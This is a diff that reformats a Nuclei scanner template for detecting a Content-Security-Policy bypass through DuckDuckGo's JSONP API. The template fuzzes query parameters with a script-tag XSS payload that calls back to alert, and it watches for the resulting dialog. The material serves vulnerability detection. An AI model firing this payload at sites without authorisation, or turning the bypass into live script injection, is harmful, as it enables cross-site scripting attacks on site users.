@@ -1,45 +1,55 @@
-flow: http(1) && headless(1)
-headless:
-- fuzzing:
-  - fuzz:
-    - '{{url_encode(injection)}}'
-    mode: single
-    part: query
-    type: replace
-  matchers:
-  - dsl:
-    - duckduckgo_api_csp_xss == true
-    type: dsl
-  payloads:
-    injection:
-    - <script src="https://api.duckduckgo.com/?q=x&callback=alert&format=json"></script>
-  steps:
-  - action: navigate
-    args:
-      url: '{{BaseURL}}'
-  - action: waitdialog
-    args:
-      max-duration: 5s
-    name: duckduckgo_api_csp_xss
-http:
-- matchers:
-  - condition: and
-    internal: true
-    part: header
-    type: word
-    words:
-    - Content-Security-Policy
-    - duckduckgo.com
-  method: GET
-  path:
-  - '{{BaseURL}}'
 id: duckduckgo-api-csp-bypass
+
 info:
+  name: Content-Security-Policy Bypass - DuckDuckGo API
   author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
   metadata:
     verified: true
-  name: Content-Security-Policy Bypass - DuckDuckGo API
-  reference:
-  - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
-  severity: medium
   tags: xss,csp-bypass,duckduckgo-api,vuln
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "duckduckgo.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: duckduckgo_api_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://api.duckduckgo.com/?q=x&callback=alert&format=json"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "duckduckgo_api_csp_xss == true"
+# digest: 4a0a00473045022100dcfbdee005b52f2f3c2bb480be1178c8c0111d91f0d5537551ab978c2b32eaea02205438a56c4566e996e6bb6a886a067a0de70ec414d5c0d419a9680bcbed8bd833:922c64590222798bb761d5b6d8e72950
